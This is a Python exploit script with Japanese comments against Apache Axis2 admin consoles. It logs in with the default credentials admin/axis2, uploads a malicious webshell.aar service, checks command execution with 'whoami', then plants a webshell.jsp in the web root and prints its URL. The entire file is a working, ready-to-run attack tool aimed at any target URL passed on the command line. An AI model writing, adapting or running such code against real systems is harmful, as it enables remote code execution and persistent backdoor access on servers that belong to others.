import requests
import time
import sys
import re

# グローバル変数
# Axis2 管理者の認証情報
username = 'admin'
password = 'axis2'
uploadFile = "webshell.aar"

# aarファイルをいじったときは変更
# axis2_webshell/META-INF/services.xmlのservice_nameを書き込む
service_name = 'service'

def exploit(target_url):
    
    # ログイン処理=======================================================
    # ログインしてセッションを取得
    login_url = f'{target_url}/axis2-admin/login'
    session = requests.Session()
    login_data = {
        'userName': username,
        'password': password,
        'submit': '+Login+'
    }
    response = session.post(login_url, data=login_data)

    # loginに失敗したとき
    if response.status_code != 200:
        print('Login failed')
        exit()
    # ==================================================================


    # AARファイルのアップロード処理=======================================
    # AARファイルをアップロードするURL
    upload_url = f'{target_url}/axis2-admin/upload'
    # ファイルアップロードはBoundary(バウンダリ)で境界を設定する必要があるのでその設定
    # Noneのところはファイルがあれば設定かな？
    files = {
        'filename'    : (uploadFile, open(uploadFile, 'rb'), 'application/octet-stream'),
    }
    # 送信
    response = session.post(upload_url, files=files)
    
    if response.status_code == 200:
        print('Upload successful')
    else:
        print('Upload failed')
    # ==================================================================


    # サービスが成功したかを判定する処理===================================
    check_url = f'{target_url}/services/{service_name}/exec?cmd=whoami'
    count = 0
    while (True):
        print('Service Runnning Wait....')
        time.sleep(3)
        # アップロードしたサービスの確認
        response = session.get(check_url)

        if response.status_code == 200:
            print('Exploit Success!!\n')
            print(response.text)
            
            # WEBSHELLの書き込み=======================================
            webshell_path = 'axis2-web/webshell.jsp'
            
            
            print('WebShell Write Start')
           
            # 書き込み先の取得
            class_path_url = f'{target_url}/services/{service_name}/getClassPath'
            response = requests.get(class_path_url)
            pattern = r'<ns:return>(.*?)</ns:return>'
            match = re.search(pattern, response.text)
            # 抽出されたパスを取得
            if match:
                target = match.group(1).replace('WEB-INF/classes/','')
                print(f'webshell write path {target}')
                # ファイルの書き込み
                write_url = f'{target_url}/services/{service_name}/upload?path={target}'
                response = requests.get(write_url)
                print(response.text + "\n")
                
                # WEBSHELLのパス
                print(f'webshell url : {target_url}/{target}')
                

            else:
                print("No match found")
                break
           
            # ========================================================

            break
        else:
            count += 1
            if(count > 10):
                print('Failed to run the service')
                break
    # ==================================================================


# メイン関数
# @ 標準出力の数に応じてエラーを出す
def main():
    # 標準入力がなければエラーで終了
    if len(sys.argv) != 2:
        print("(+) usage: {0} <target>".format(sys.argv[0]))
        print('(+) eg: {0} http://127.0.0.1:8080/axis2'.format(sys.argv[0]))
        sys.exit(-1)
        
    tgt_ip = sys.argv[1]
    exploit(tgt_ip)
    
    

if __name__ == '__main__':
    main()
